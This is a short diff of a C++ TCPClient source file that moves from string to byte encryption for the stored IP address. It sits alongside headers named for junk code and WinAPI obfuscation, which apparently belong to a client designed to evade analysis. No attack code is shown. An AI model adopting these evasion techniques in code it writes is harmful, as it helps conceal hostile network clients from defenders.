@@ -1,9 +1,9 @@
 #include "TCPClient.h"
 #include "junk_codes.h"
-#include "string_encryption.h"
+#include "byte_encryption.h"
 #include "winapi_obfuscation.h"
 
-TCPClient::TCPClient(EncryptedString* ipAddr, int port)
+TCPClient::TCPClient(EncryptedBytes* ipAddr, int port)
 {
 	this->sock = 0;
 	this->ipAddr = ipAddr;
